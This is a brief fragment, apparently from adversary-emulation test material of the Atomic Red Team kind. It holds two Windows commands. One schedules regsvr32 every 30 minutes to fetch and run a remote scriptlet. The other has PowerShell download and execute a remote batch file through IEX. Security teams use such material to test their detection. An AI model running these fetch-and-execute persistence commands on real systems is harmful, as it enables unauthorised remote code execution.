...
SCHTASKS /Create /SC MINUTE /TN "Atomic Testing" /TR "regsvr32.exe /s /u /i:https://raw.githubusercontent.com/cvt111/atomic-red-team/master/Windows/Payloads/RegSvr32.sct scrobj.dll" /mo 30
...
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cvt111/atomic-red-team/master/ARTifacts/Misc/Discovery.bat')" > output.txt
